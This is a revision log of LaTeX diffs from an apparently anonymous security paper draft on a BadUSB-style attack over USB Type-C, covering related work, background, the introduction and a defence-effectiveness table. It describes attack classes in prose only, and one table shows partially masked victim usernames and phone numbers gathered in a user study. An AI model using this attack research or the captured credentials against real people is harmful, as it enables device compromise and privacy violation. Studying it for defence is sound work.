 Additionally, some keywords such as \textit{account, username and password} often appear with users' input data because they are often used as labels of input boxes.
-Such keywords are more likely to lead us to discover user-specific data.
+Such keywords are more likely to lead us to user-specific data.
 For example, when we searched with \textit{account} as keyword, victim's accounts can be found in the database, as shown in the Table~\ref{tab:ocr_keyword_example}.
@@
 		username & X 8B cas.******.edu.cn Username: 117***18 Password:                                                                           & \textless{}user1\textgreater{} & 385          \\ \hline
-		username & Login Weibo Login with SMS and verification code ...... +86 151****4587 Get verification code Login with username \& password & \textless{}user5\textgreater{} & 1947         \\ \hline
+		username & Login Weibo Login with SMS and verification code ...... +86 151****4587 & \textless{}user5\textgreater{} & 1947         \\ \hline
 		username & QQ 14*****50| Login with phone number New user registration 2345678 9 0                                                       & \textless{}user3\textgreater{} & 4308         \\ \hline

### 2021-01-25 WOOT/Files/__latexindent_temp.tex
[related_work] table improved

--- 2020-12-20 WOOT/Files/related_work.tex
@@
 \label{sec:related_work}
-In this part, we survey related works on USB attack security in Section III-A, and USB defence security in Section III-B, respectively.
-\subsection{USB Attack Security}
-USB 1.0\cite{usb01} was first introduced in 1996, which was designed to provide interfaces for disparate peripherals and reduce the complexity of both hardware design and software configuration\cite{sok}.
-USB 1.0 provided the data transfer for Low Speed(1.5 Mbit/s) and Full Speed( 12Mbit/s).
-Before USB 2.0 was released in 2000 and widely used, USB attacks are limited to human layer error attacks, \cite{se}, \cite{goverment}, \cite{atkvec}, \cite{ueerreallydo}, e.g, throwing a bad USB device on purpose, are in order to damage host through plugging in a peripheral by trust default.
+%\hongyi{Move the stuff about USB protocol to Background}\\
+%\outline{Attack based on USB 1.0, briefly}\\
+%\outline{Attack based on USB 2.0, focus on works about application and transport layer}\\
+%\outline{Attack survey table}\\
+%\outline{Attack or current works about USB Type-C}\\
 
-USB 2.0 protocol increased the speed of data transfer and it was also expended to include digit cameras.
-According to the protocol, the host recognises the peripherals through enumeration, and this gives attacked chance to cheat the host.
-BadUSB\cite{badusb} is going to attack host by modifying the devices' identify, re-flash the firmware to add more functionalities to the USB devices, for example, it can present malicious interfaces as a sample HID interfaces or work as a network adapter on a USB thumb driver.
-Other USB attacks, \cite{rubber}, \cite{usbdriver}, \cite{usbbypassing}, \cite{iseeyou} are also masquerading the USB protocol and provided illegal functionality interface to the host, taking advantage of the permissive trust model in USB whereby the host fully trust the devices connected.
-\cite{syzkaller} use the fact that the host's USB software stack generally expects devices with a standard USB protocol, with the help of fuzzing techniques using FaceDancer \cite{facedancer} and debuggers, it takes a number of vulnerabilities to the kernel-model.
-Furthermore, expect from the protocol related attack, the radio frequency based sensitive data stealing is another kind of attack, \cite{smartphone} , \cite{poweremi}, \cite{badusbhub}, \cite{usbfinger}, \cite{side}, \cite{usbdriver} work based on signal eavesdropping to attack during the data extraction, and \cite{usbkiller}, \cite{cable}, \cite{usbee}, \cite{turnip} use the RF transmitter to inject signal to cause physical damage to the host machine.
+In this part, we survey related works on USB attack in Section~\ref{subsec:usb_attack}, and USB defence security in Section \ref{subsec:usb_defence}, respectively.
 
-As our best knowledge, attacks based on USB 3.0\cite{usb03} have not been discovered.
-In this work, we focus on attack based on USB 3.0 in the layer of transport\cite{sok}, which use the USB protocol to control the host or inject malicious command to the host connected with Type-C\cite{typec}, and streal the data trough it.
+\subsection{USB Attack}
+\label{subsec:usb_attack}
+\chaozu{DoS(Fuzzing), Code injection, HID emulation, JFC, our work}
+During the development of USB protocol, there are many USB-based attacks were proposed, ranging from DoS (denial of service) to protocol masquerading.
+Here we will introduce them following an order of their category.\hongyi{What?}
+
+From the kernel perspective, its USB software stack generally expects devices to follow the USB standard and may not consider corner cases of malformed USB packets.
+Based on this, Facedancer\cite{facedancer} and Syzkaller\cite{syzkaller} uses fuzzing technique to uncover the bugs lying in the kernel drivers.
+These bugs can cause kernel crash and lead to a DoS situation.
+Though this poses a great challenge to the availability of a system, this attack still requires physical access to the host and is unable to cause more damage other than DoS.
+
+In the field of USB security, protocol masquerading is also a widely used attack scheme.
+Due to the lack of authentication in USB protocol, malicious devices can hide their real functionality with re-written firmware\cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver}.
+These works rewrite the firmware of a normal-looking flash drive, which allows it to pretend as other devices.
+When these modified drives are connected to the host, they will be recognized as keyboard or mouse.
+Then the attacker can execute malicious payloads as they were using the victim's devices.
+But due to the limitation of USB 2.0\cite{usb20} protocol, these BadUSB attacks are unable to obtain video feedback from the victim as video were not supported until USB 3.0 \cite{usb30}.
+Though USB 2.0 does not support video transmission, there exists a protocol called MHL(Mobile High-Definition Link) which extends the USB standard and allow video signal to be transmitted through USB interface.
+JFC\cite{JFC}, short for juicy filming charging is such a work which abuses this standard and exfiltrate video data from victim without permission.
+But in JFC, this data exfiltration is not combined with BadUSB attacks and MHL is an outdated standard, which limits its capability.
+
+Besides attacking from the protocol perspective, there are works trying to use USB device as a payload delivery means.
+Duqu\cite{duqu} uses a user-mode rootkit to hide malicious files on the USB storage device, \cite{flame} uses a zero-day exploit and malicious \textit{autorun.inf} to execute the malware automatically.
+There are also works like \cite{brain, stuxnet, conficker} following the same paradigm and performing code-injection attacks.
+These attacks are much more damaging and flexible comparing to those previous ones, but they requires certain existing flaw like \cite{zero-day} and USB are merely a payload delivery method.
+
+As a data transmission protocol, USB inevitably leaks electromagnetic signals to the environment which may contains sensitive information.
+Leveraging this physical phenomenon, there are works like \cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} eavesdropping leaked signals and recovering the sensitive data.
+In a similar fashion, \cite{usbee, turnip} emit electromagnetic emissions by data injection on the bus with the connected USB devices as a RF transmitter and \cite{usbkiller, cable} inject analog power to cause physical damage to the host machine.
+Even though the data, including the video data, could be recovered in this way, these attacks for executing malicious code is too difficult to work, and the invisibility is a problem cannot be ignored due to the spacial locality of radio frequency.
+
+Since USB 3.1 was introduced with USB Type-C in 2013, display port and HDMI connectors have been provided by USB Type-C, transferring of video data can be combined with the other attacks, like protocol masquerading,  protocol corruption and code injection.
+This has paved the path for our \tool.
+
+\chaozu{attack table}\\
+\chaozu{enum diagram}
 
 \subsection{USB Defence Security}
+\label{subsec:usb_defence}
+There are already many defenses proposed against BadUSB attacks and a comprehensive investigation of previous work.\cite{sok}.
+
+From the hardware perspective, BadUSB attack requires `D-' and `D+' pins which are defined by protocol to transmitting data.
+Without these pins, data can't be transferred via USB cable.
+Based on this fact, USB Condom \cite{Condom} is a hardware solution to block data channel by adding blocker in the connector.
+This blocker can cut off the `D-' and `D+' connection while leave power pins intact.
+However, this method poses a great challenge to plug-and-play property of USB, as once it is deployed, it will stop all USB functions other than charging.
+
+Under the premise of ensuring the full functionality of USB devices, there have been some works trying to improve the security during connection establishment.
+Windows Defender ATP\cite{windenfenderwhite} maintains a whitelist of USB devices, only devices on the whitelist are allowed to communicate with the host.
+This prevents all potential attacks from untrusted devices.
+But this requires users to have a certain safety awareness and technical background to maintain a valid whitelist.
+For example, a naive user may add the USB device from unknown sources to his/her whitelist without precaution.
+There are designs can overcome this drawback.
+For instance, Mohammadmoradi et al\cite{mohammadmoradi2018making} proposes a strategy to generate such a whitelist automatically.
+This strategy first generates a unique fingerprint for each device based on its functionality.
+Then these fingerprints are used to maintain a safe and valid whitelist of USB devices.
+There is another work mediating USB connectivity for Industrial Control.
+TMSUI\cite{yang2015tmsui} relies on rich experience of administrators to build a whitelist.
+However, some modified USB devices may hide their real functionality from the user.
+
+To solve this flaw, GoodUSB\cite{tian2015defending} will report the functionality claimed by the device to user and let user decides whether to authorize.
+When a device is plugged in, GoodUSB will load its driver but limit its functionality until a series of authorizations is completed.
+These authorizations are designed to be performed manually.
+As BadUSB is normally unable to obtain the video stream of the host, it is impossible for an attacker to complete these authorization with automatic script.
+Thus this defense is sufficient for normal BadUSB attack.
+But if the attacker has the access to victim's screen, GoodUSB will be bypassed easily as the attacker can just complete these authorization manually and perform subsequent attacks.
+
+After the USB enumeration and driver loading, there are also works trying to archive `defense in depth' against BadUSB attack.
+Neuner et al.\cite{neuner2018usblock} prevents BadUSB attacks from malicious flash drive by analyzing the temporal characteristics of BadUSB-like attacks.
+This defense mechanism is effective because the attacker cannot obtain the screen of the host using just BadUSB.
+In this case, the malicious device can only inject key stoke in a very short time to reduce the risk of being discovered.
+This defect causes the typing characteristics of BadUSB to be detectable.
+Pham et al.
+\cite{pham2010optimizing} optimizing windows security features.
+It can block the execution of unsigned files, the installation of unsigned driver carried on portable media.
+What's more, in GoodUSB, a VM is deployed in host to as a honeypot to detect and stop malicious behavior of USB devices.
+
+In addition to injection attacks, data theft attack is also one of the focuses of academic community.
+As mentioned in Section~\ref{subsec:usb_attack}, there exist an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL standard to steal video stream from the victim.
+In order to mitigate this issue, Meng et al.\cite{JFC} proposed a statistical model using status like GPU/CPU usage to detect JFC attack.
+
+To summarize, there exists a clear trade-off between the effectiveness and the plug-and-play property.
+Though hardware disabling solution like USB Condom archives the almost absolute security, the functionality of USB is scarified.
+Other solutions like GoodUSB or whitelist are either bypassable or insufficient under certain cases.
+Some vendors may sacrifice defensive capabilities to improve usability, which allows attackers to take advantage of.
+
+We summarize the former effort in USB attack and defense in Table~\ref{table:attack_vs_defense}, which illustrates the effectiveness of each defense against various attacks including our \tool.
+\newcommand{\circlefull}{\includegraphics[scale=0.025]{Figs/circle_full.png}}
+\newcommand{\circlehalf}{\includegraphics[scale=0.025]{Figs/circle_half.png}}
+\newcommand{\circleempty}{\includegraphics[scale=0.025]{Figs/circle_empty.png}}
+\begin{table*}
+	\centering
+	\begin{tabular}{|c|c|c|c|c|c|c|c|c|}
+
+		\hline
+		\diagbox[width=1.46in] {Defence}{Attack} & Facedancer\cite{facedancer}, Syzkaller\cite{syzkaller} & \cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC\cite{JFC}&Duqu\cite{duqu}& \cite{brain, stuxnet, conficker,flame}&\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} &\cite{usbkiller, cable, usbee, turnip}&Armory\\
+		\hline
+		\makecell{USB condom \cite{Condom}}& \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circlefull& \circlefull &\circlefull\\
+		\hline
+		\makecell{
+			Windows Defender ATP\cite{windenfenderwhite}, \\
+			Mohammadmoradi et al\cite{mohammadmoradi2018making}, \\
+			TMSUI\cite{yang2015tmsui}
+		}& \circleempty & \circlehalf & \circlehalf & \circlehalf &\circlehalf& \circleempty& ???????? &\circlehalf\\
+
+		\hline
+		GoodUSB\cite{tian2015defending}& \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circleempty& \circlefull &\circleempty\\
+		\hline
+
+		Neuner et al.\cite{neuner2018usblock}& \circleempty & \circlefull & \circleempty & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
+		\hline
+		Pham et al. \cite{pham2010optimizing}& \circleempty & \circleempty & \circleempty & \circlefull &\circlefull& \circleempty& \circleempty &\circleempty\\
+		\hline
+		JFCGuard\cite{JFC}& \circleempty & \circleempty & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty & ??? \\
+			\hline
+	\end{tabular}
+	\linebreak
+    \begin{tablenotes}
+	\footnotesize
+	\item[1] \circlefull means that the defense is effective
+	\item[2] \circlehalf means that the defense is partial effective
+	\item[3] \circleempty means that the defense is uneffective
+	\end{tablenotes}
+	\caption{Effectiveness of defense against different attacks}
+	\label{table:attack_vs_defense}
+\end{table*}

### 2021-01-25 WOOT/Files/related_work.tex
[related_work] table improved

@@
 		\hline
-		\diagbox[width=1.46in] {Defence}{Attack} & Facedancer\cite{facedancer}, Syzkaller\cite{syzkaller} & \cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC\cite{JFC}&Duqu\cite{duqu}& \cite{brain, stuxnet, conficker,flame}&\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} &\cite{usbkiller, cable, usbee, turnip}&Armory\\
+		\diagbox[width=1.46in] {Defence}{Attack} & \makecell{Facedancer\cite{facedancer},\\ Syzkaller\cite{syzkaller}} & \cite{rubber, badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC\cite{JFC}&Duqu\cite{duqu}& \cite{brain, stuxnet, conficker,flame}&\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} &\cite{usbkiller, cable, usbee, turnip}& \tool \\
 		\hline
-		USB condom \cite{Condom}& \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circlefull& \circlefull &\circlefull\\
+		\makecell{USB condom \cite{Condom}} & \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circlefull& \circlefull &\circlefull\\
 		\hline
-		Windows Defender ATP\cite{windenfenderwhite}, Mohammadmoradi et al\cite{mohammadmoradi2018making}, TMSUI\cite{yang2015tmsui}& \circleempty & \circlehalf & \circlehalf & \circlehalf &\circlehalf& \circleempty& ????????
-&\circlehalf\\
+		\makecell{
+			Windows Defender ATP\cite{windenfenderwhite}, \\
+			Mohammadmoradi et al\cite{mohammadmoradi2018making}, \\
+			TMSUI\cite{yang2015tmsui}
+		}& \circleempty & \circlehalf & \circlehalf & \circlehalf &\circlehalf& \circleempty& ???????? &\circlehalf\\
+
 		\hline
-		GoodUSB\cite{tian2015defending}& \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circleempty& \circlefull &\circleempty\\
+		\makecell{GoodUSB\cite{tian2015defending}} & \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circleempty& \circlefull &\circleempty\\
 		\hline
 
-		Neuner et al.\cite{neuner2018usblock}& \circleempty & \circlefull & \circleempty & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
+		\makecell{Neuner et al.\cite{neuner2018usblock}} & \circleempty & \circlefull & \circleempty & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
 		\hline
-		Pham et al. \cite{pham2010optimizing}& \circleempty & \circleempty & \circleempty & \circlefull &\circlefull& \circleempty& \circleempty &\circleempty\\
+		\makecell{Pham et al. \cite{pham2010optimizing}} & \circleempty & \circleempty & \circleempty & \circlefull &\circlefull& \circleempty& \circleempty &\circleempty\\
 		\hline
-		JFCGuard\cite{JFC}& \circleempty & \circleempty & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty & ??? \\
+		\makecell{JFCGuard\cite{JFC}} & \circleempty & \circleempty & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty & ??? \\
 			\hline

### 2021-01-25 WOOT/Files/related_work.tex
polish table

--- 2021-01-25 WOOT/Files/related_work.tex
@@
 There are designs can overcome this drawback.
-For instance, Mohammadmoradi et al\cite{mohammadmoradi2018making} proposes a strategy to generate such a whitelist automatically.
+For instance, Mohammadmoradi et al.\cite{mohammadmoradi2018making} proposes a strategy to generate such a whitelist automatically.
 This strategy first generates a unique fingerprint for each device based on its functionality.
@@
 	\centering
-	\begin{tabular}{|c|c|c|c|c|c|c|c|c|}
+	\begin{tabular}{|c|c|c|c|c|c|c|c|}
 
 		\hline
-		\diagbox[width=1.46in] {Defence}{Attack} & Facedancer\cite{facedancer}, Syzkaller\cite{syzkaller} & \cite{rubber,badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC\cite{JFC}&Duqu\cite{duqu}& \cite{brain, stuxnet, conficker,flame}&\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver} &\cite{usbkiller, cable, usbee, turnip}&Armory\\
+		\diagbox[width=1.52in] {Defence}{Attack} & \makecell*[c]{Facedancer\cite{facedancer},\\ Syzkaller\cite{syzkaller}} & \cite{rubber, badusb, rubberducky2020, usbbypassing, iseeyou, usbdriver} & JFC\cite{JFC}&Duqu\cite{duqu},\cite{brain, stuxnet, conficker,flame}&\cite{smartphone, poweremi,revealing,su2017usb, usbgpslocator, bates2014leveraging, badusbhub, usbfinger, side, usbdriver, usbee, turnip}&\cite{usbkiller, cable}& \tool \\
 		\hline
-		USB condom \cite{Condom}& \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circlefull& \circlefull &\circlefull\\
+		\makecell{USB condom \cite{Condom}} & \makecell*[c]{\circlefull} & \circlefull & \circlefull &\circlefull& \circlefull&  \circleempty&\circlefull\\
 		\hline
-		Windows Defender ATP\cite{windenfenderwhite}, Mohammadmoradi et al\cite{mohammadmoradi2018making}, TMSUI\cite{yang2015tmsui}& \circleempty & \circlehalf & \circlehalf & \circlehalf &\circlehalf& \circleempty& ????????
-&\circlehalf\\
+		\makecell{
+			Windows Defender ATP\cite{windenfenderwhite}, \\
+			Mohammadmoradi et al.\cite{mohammadmoradi2018making}, \\
+			TMSUI\cite{yang2015tmsui}
+		}& \circleempty & \circlehalf & \circlehalf &\circlehalf& \circleempty&  \circleempty &\circlehalf\\
+
 		\hline
-		GoodUSB\cite{tian2015defending}& \circlefull & \circlefull & \circlefull & \circlefull &\circlefull& \circleempty& \circlefull &\circleempty\\
+		\makecell{GoodUSB\cite{tian2015defending}} & \makecell*[c]{\circlehalf} & \circlefull & \circlefull &\circlefull& \circleempty&  \circleempty &\circleempty\\
 		\hline
 
-		Neuner et al.\cite{neuner2018usblock}& \circleempty & \circlefull & \circleempty & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
+		\makecell{Neuner et al.\cite{neuner2018usblock}} & \makecell*[c]{\circleempty} & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty &\circleempty\\
 		\hline
-		Pham et al. \cite{pham2010optimizing}& \circleempty & \circleempty & \circleempty & \circlefull &\circlefull& \circleempty& \circleempty &\circleempty\\
+		\makecell{Pham et al. \cite{pham2010optimizing}} & \makecell*[c]{\circleempty} & \circleempty & \circleempty &\circlefull& \circleempty& \circleempty &\circleempty\\
 		\hline
-		JFCGuard\cite{JFC}& \circleempty & \circleempty & \circlefull & \circleempty &\circleempty& \circleempty& \circleempty & ??? \\
+		\makecell{JFCGuard\cite{JFC}} & \makecell*[c]{\circleempty} & \circleempty & \circlefull &\circleempty&  \circleempty  & \circleempty& \circlefull \\
 			\hline
@@
 	\footnotesize
-	\item[1] \circlefull means that the defense is effective
-	\item[2] \circlehalf means that the defense is partial effective
-	\item[3] \circleempty means that the defense is uneffective
+	\item[1] \circlefull  \@ means that the defense is effective
+	\item[2] \circlehalf \@ means that the defense is partial effective
+	\item[3] \circleempty \@  means that the defense is uneffective
 	\end{tablenotes}

### 2021-01-26 WOOT/BadUSBC.tex
Add implementation part and LaTeX writing convention
XD
add new convention about label, combine member's .tex,
fix reference
add util.tex
add outline
Comments
add impl part, todo: three mode
Balanced layout of references
complete the coutermeasure
Add page number
a pass on intro.
Anonymous

@@
 % The preceding line is only needed to identify funding in the first footnote. If that is unneeded, please comment it out.
-\usepackage{cite}
-\usepackage{amsmath,amssymb,amsfonts}
-\usepackage{algorithmic}
-\usepackage{graphicx}
-\usepackage{textcomp}
-\usepackage{xcolor}
+
+\makeatletter
+\def\lst@makecaption{%
+  \def\@captype{table}%
+  \@makecaption
+}
+\makeatother
+
+\input{./Files/util.tex}
+
 \def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
     T\kern-.1667em\lower.7ex\hbox{E}\kern-.125emX}}
+
 \begin{document}
 
-\title{Is It Possible to Steal Money Through USB-C?
-}
+\title{\tool: Revisiting BadUSB with Type-C}
 
-\author{\IEEEauthorblockN{1\textsuperscript{st} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
-\and
-\IEEEauthorblockN{2\textsuperscript{nd} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
-\and
-\IEEEauthorblockN{3\textsuperscript{rd} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
-\and
-\IEEEauthorblockN{4\textsuperscript{th} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
-\and
-\IEEEauthorblockN{5\textsuperscript{th} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
-\and
-\IEEEauthorblockN{6\textsuperscript{th} Given Name Surname}
-\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-\textit{name of organization (of Aff.)}\\
-City, Country \\
-email address or ORCID}
-}
+\author{Anonymous Authors}
+%\author{\IEEEauthorblockN{1\textsuperscript{st} Given Name Surname}
+%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
+%\textit{name of organization (of Aff.)}\\
+%City, Country \\
+%email address or ORCID}
+%\and
+%\IEEEauthorblockN{2\textsuperscript{nd} Given Name Surname}
+%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
+%\textit{name of organization (of Aff.)}\\
+%City, Country \\
+%email address or ORCID}
+%\and
+%\IEEEauthorblockN{3\textsuperscript{rd} Given Name Surname}
+%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
+%\textit{name of organization (of Aff.)}\\
+%City, Country \\
+%email address or ORCID}
+%\and
+%\IEEEauthorblockN{4\textsuperscript{th} Given Name Surname}
+%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
+%\textit{name of organization (of Aff.)}\\
+%City, Country \\
+%email address or ORCID}
+%\and
+%\IEEEauthorblockN{5\textsuperscript{th} Given Name Surname}
+%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
+%\textit{name of organization (of Aff.)}\\
+%City, Country \\
+%email address or ORCID}
+%\and
+%\IEEEauthorblockN{6\textsuperscript{th} Given Name Surname}
+%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
+%\textit{name of organization (of Aff.)}\\
+%City, Country \\
+%email address or ORCID}
+%}
 
@@
 \thispagestyle{plain}
+\pagestyle{plain}
 
 \begin{abstract}
-Abstract~\cite{CGF1}.
+\outline{Brief intro of USB protocol}\\
+\outline{Brief intro of Rubber Ducky}\\
+\outline{What have we done, our contribution}\\
+\outline{Our experiment/case study, Attack of shops}\\
 \end{abstract}
@@
 \begin{IEEEkeywords}
-BadUSB
+USB;BadUSB
 \end{IEEEkeywords}
@@
 \input{./Files/experiment.tex}
+\input{./Files/countermeasure.tex}
 \input{./Files/discussion.tex}
@@
 \bibliography{BadUSBC}
+\balance
 

### 2021-01-26 WOOT/Files/related_work.tex
fix JFCGuard
Figures

@@
 As mentioned in Section~\ref{subsec:usb_attack}, there exist an attack called JFC (juicy film charging)\cite{JFC} which abuses the MHL standard to steal video stream from the victim.
-In order to mitigate this issue, Meng et al.\cite{JFC} proposed a statistical model using status like GPU/CPU usage to detect JFC attack.
+In order to mitigate this issue, Meng et al.\cite{meng2018252} proposed a statistical model using status like GPU/CPU usage to detect JFC attack.
 
@@
 		\hline
-		\makecell{JFCGuard\cite{JFC}} & \makecell*[c]{\circleempty} & \circleempty & \circlefull &\circleempty&  \circleempty  & \circleempty& \circlefull \\
+		\makecell{JFCGuard\cite{meng2018252}} & \makecell*[c]{\circleempty} & \circleempty & \circlefull &\circleempty&  \circleempty  & \circleempty& \circlefull \\
 			\hline
@@
 	\end{tablenotes}
-	\caption{Effectiveness of defense against different attacks}
+	\caption{Effectiveness of Defense against Different Attacks}
 	\label{table:attack_vs_defense}

### 2021-01-26 WOOT/Files/introduction.tex
Update intro

@@
 Moreover, we conducted a series of experiments for each attack mode as well as for different types of devices, including smart phones, personal computers, and tablet computers, to validate the usability of \tool.
-At last, we conducted a user study for attacks in sharing power banks, one of the application scenarios of \tool.
+We also conducted a user study for attacks in sharing power banks, one of the application scenarios of \tool.
 During the user study, we obtained plenty of sensitive data through \tool, since users are usually unconscious of the necessity to check the USB devices they plugged in for security purposes.
+After the validation of our attack model, we proposed several defence methods as countermeasures, including external hardware authorization, distrust-by-default, etc.
+It is worth noting that we designed a method, called isolated UI rendering, to separate the user interface into sensitive and insensitive layers.
+Only content on the insensitive layer will be passed to the insecure driver and thus rendered on external display, which protects content on the sensitive layer.
 %\shuqing{Case study, evaluation, notable results.}
@@
 	\item We conducted multiple experiments and a user study to validate the usability and effectiveness of \tool.
-\shuqing{Notable results.} \fengwei{Add countermeasures, in particular the isolation design.}
+	We also proposed several countermeasures for our attack model, which are reasonable and insightful.
+\fengwei{Add countermeasures, in particular the isolation design.}\shuqing{Isolated UI rendering is added in the last paragraph.}
 \end{itemize}

### 2021-01-27 WOOT/Files/background.tex
[background] change "armory" to "\tool"
pass on bg

@@
 %\noindent\outline{USB Standard}\\
-We first introduce the development of USB specification and emphasize the key points adopted in our work.
-We also organized a brief timeline introducing key points of each protocol in Table~\ref{table:usb_timeline}.
+
+We first introduce the development of USB specification and emphasize the key
+points adopted in this work. We also organized a brief timeline for introducing
+key points of each protocol in Table~\ref{table:usb_timeline}.
 
 %\noindent\outline{USB1.x}\\
-Proposed in 1996, USB 1.0\cite{usb10} was developed to provide an unified interface and thus reducing the cost of re-configuring the software.
-It is worth mentioning that as a polled-bus interface, all data transfers are initiated by the host.
+Proposed in 1996, USB 1.0\cite{usb10} was developed to provide an unified
+interface and thus reducing the cost of re-configuring the software. It is
+worth mentioning that as a polled-bus interface, all data transfers are
+initiated by the host.
 
 %\noindent\outline{HID Protocol}\\
-Right after one year of the appearance of USB 1.0, a standard named HID (Human Interface Device)\hongyi{Citation Needed} was born on the basis of USB.
-HID is designed with the goal of unifying the implementation for devices like mouse, keyboard and so on.
-Before its appearance, the standard is divided between manufacturers, for example, mouses of Company A may uses X-Y coordinates to represent its location while mouses of Company B uses relative displacement.
-This means every device needs their own drivers to work.
-After HID, people just write one driver for an entire class of HIDs.
-Furthermore, HID standard also requires all devices to be PnP (\emph{Plug-and-Play}), which is indeed convenient but very dangerous too.
+Right after one year of the appearance of USB 1.0, a standard named HID (Human
+Interface Device)\hongyi{Citation Needed} was born on the basis of USB. HID is
+designed with the goal of unifying the implementation for devices like mouse,
+keyboard, etc. Before its appearance, the standard is divided between
+manufacturers, for example, mouses of Company A may uses X-Y coordinates to
+represent its location while mouses of Company B uses relative displacement.
+This means every device needs their own drivers to work. After HID, people just
+write one driver for an entire class of HIDs. Furthermore, HID standard also
+requires all devices to be PnP (\emph{Plug-and-Play}), which is indeed
+convenient but may be insecure too.
 
-In 1998, the first widely supported USB protocol was born.
-USB1.1\cite{usb11} provided two data transfer rates which are Low Speed (1.5 Mbit/s) and Full Speed (12 MBit/s).
-At this point, due to the transfer limit, it only supports limited kinds of devices like keyboard, mice, etc.
+In 1998, the first widely supported USB protocol was born. USB1.1\cite{usb11}
+provided two data transfer rates which are Low Speed (1.5 Mbit/s) and Full
+Speed (12 MBit/s). At this point, due to the transfer limit, it only supports
+limited types of devices like keyboard, mice, etc.
 
 %\noindent\outline{USB2.0}\\
-In 2000, USB 2.0\cite{usb20} specification was released.
-With High Speed (480 Mbit/s) mode introduced, printer, camera, CD-ROM drive and network cards were supported in this revision.
-Such high data transfer rate also gave rise to the popularity of ``flash drive'', portable device that allows physically transferring data around \cite{sok}.
-Though various peripherals were supported in USB 2.0, there was no reliable way to identify the type of a device.
-This security flaw allowed attacks like BadUSB\cite{rubber}.
+In 2000, USB 2.0\cite{usb20} specification was released. With High Speed (480
+Mbit/s) mode introduced, printer, camera, CD-ROM drive and network cards were
+supported in this revision. Such high data transfer rate also gave rise to the
+popularity of ``flash drive'', portable device that allows physically
+transferring data around~\cite{sok}. Though various peripherals were supported
+in USB 2.0, there was no reliable way to identify the type of a device. This
+security flaw allowed attacks like BadUSB~\cite{rubber}.
 
 %\noindent\outline{USB3.x}\\
-USB 3.0\cite{usb30} was announced in 2008, with a Super Speed (5 Gbit/s) data transfer rate.
-Like its predecessor, more classes of peripherals were supported in this revision.
-In 2013, USB Type-C connector standard was introduced as a part of USB 3.1\cite{usb31}, providing a unified connector type for PowerDelivery (PD), Thunderbolt, DisplayPort and HDMI.
-Yet no improvement of security was introduced in 3.x revisions, meaning any device claiming themselves as a monitor can capture the video stream from the host.
-Exposing such multi-propose connector unprotected is dangerous and allows attacks like our work \tool.
-In 2017, USB 3.2\cite{usb32} was released, doubling the data transfer rate.
-(20 Gbit/s)
+USB 3.0\cite{usb30} was announced in 2008, with a Super Speed (5 Gbit/s) data
+transfer rate. Like its predecessor, more classes of peripherals were supported
+in this revision. In 2013, USB Type-C connector standard was introduced as a
+part of USB 3.1\cite{usb31}, providing a unified connector type for
+PowerDelivery (PD), Thunderbolt, DisplayPort, and HDMI.  Yet no improvement of
+security was introduced in 3.x revisions, meaning any device claiming
+themselves as a monitor can capture the video stream from the host. Exposing
+such multi-propose connector unprotected is dangerous and allows attacks like
+this work \tool. In 2017, USB 3.2\cite{usb32} was released, doubling the data
+transfer rate (20 Gbit/s).
 
@@
 \end{figure}
-As illustrated in Figure~\ref{fig:usb_conn}, the original USB 1.x \& 2.x connector only has two pins for data transferring (D+ \& D-), which has significantly limited data transfer rate (5 Gbits/s Max) and support for peripheral like DisplayPort (10.8 Gbit/s Min).
-Apart from that, support for other peripheral also requires dedicated transferring lane as their standards are not compatible with USB in most cases.
-\begin{figure}[t]
-	\centering
-	\includegraphics[width=\linewidth]{./Figs/usb_c_conn.png}
-	\caption{USB Type C Connector}
